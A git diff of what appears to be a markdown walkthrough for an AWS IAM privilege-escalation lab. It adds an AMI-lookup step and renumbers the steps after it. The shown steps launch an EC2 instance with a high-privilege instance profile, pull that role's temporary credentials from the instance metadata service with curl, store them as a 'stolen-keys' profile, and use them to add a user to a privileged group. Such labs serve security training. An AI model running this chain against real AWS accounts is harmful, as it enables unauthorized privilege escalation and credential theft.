@@ -243,7 +243,12 @@ OR import existing one:
 aws ec2 import-key-pair --key-name id_rsa --public-key-material fileb://~/.ssh/id_rsa.pub --region us-east-1
 ```
 
-11.  Create an EC2 instance with the higher privilege instance-profile optional `--profile` flag
+11. Find an available EC2 image that can be used 
+    - If allowed to use public images (refer to [Find an AWS AMI](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/finding-an-ami.html)) and use an available AMI ID
+    - If environment is more restrictive and for example only allows private images, run the following command in the region and copy down an ImageID.
+        - `aws ec2 describe-images --owners self --region us-east-1`
+
+12.  Create an EC2 instance with the higher privilege instance-profile optional `--profile` flag
 
 **TODO - Below is example
     - need add explanation
@@ -253,12 +258,12 @@ aws ec2 import-key-pair --key-name id_rsa --public-key-material fileb://~/.ssh/i
 aws ec2 run-instances --image-id ami-0708edb40a885c6ee --instance-type t2.micro --iam-instance-profile Name=privesc-high-priv-service-profile --key-name my-key-pair --security-group-ids sg-04edcd63f405badb6 --region us-east-1
 ```
 
-12. Search for and copy the instance-id from output above and run the following command to obtain the public IP address.
+13. Search for and copy the instance-id from output above and run the following command to obtain the public IP address.
 ```
 aws ec2 describe-instances --instance-id <INSTANCE_ID> --region us-east-1
 ```
     
-13. Search for and copy the Public IP Address and then SSH into the instance using your ssh key based on which key you used earlier.
+14. Search for and copy the Public IP Address and then SSH into the instance using your ssh key based on which key you used earlier.
 
 ```
 ssh ubuntu@<INSTANCE_PUBLIC_IP> -i my-key-pair.pem   
@@ -266,7 +271,7 @@ ssh ubuntu@<INSTANCE_PUBLIC_IP> -i my-key-pair.pem
 ssh ubuntu@<INSTANCE_PUBLIC_IP> -i ~/.ssh/id_rsa
 ```
 
-14. Run a curl command inside the machine to access with the role name - TODO, provide detail as to how to get the role name
+15. Run a curl command inside the machine to access with the role name - TODO, provide detail as to how to get the role name
 Refs: 
 - https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/iam-roles-for-amazon-ec2.html
 - https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html
@@ -280,7 +285,7 @@ TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metad
 && curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/iam/security-credentials/privesc-high-priv-service-role
 ```
 
-15. From another termnial (not the ssh session), create a new profile and add the access, secret key, and region and then edit the credentials file to also add the token
+16. From another termnial (not the ssh session), create a new profile and add the access, secret key, and region and then edit the credentials file to also add the token
 
 ```
 aws configure --profile stolen-keys
@@ -292,12 +297,12 @@ vi ~/.aws/credentials
 aws_session_token = <TOKEN>
 ```
  
-16. Add user to group using the **stolen-keys** profile
+17. Add user to group using the **stolen-keys** profile
 ```
 aws iam add-user-to-group --group-name privesc-sre-group --user-name privesc3-CreateEC2WithExistingInstanceProfile-user --profile stolen-keys
 ```
  
-17. Verify the user now belows to the higher privilege group with optional `--profile` flag
+18. Verify the user now belows to the higher privilege group with optional `--profile` flag
 ```
 aws iam list-groups-for-user --user-name privesc3-CreateEC2WithExistingInstanceProfile-user
 ``` 
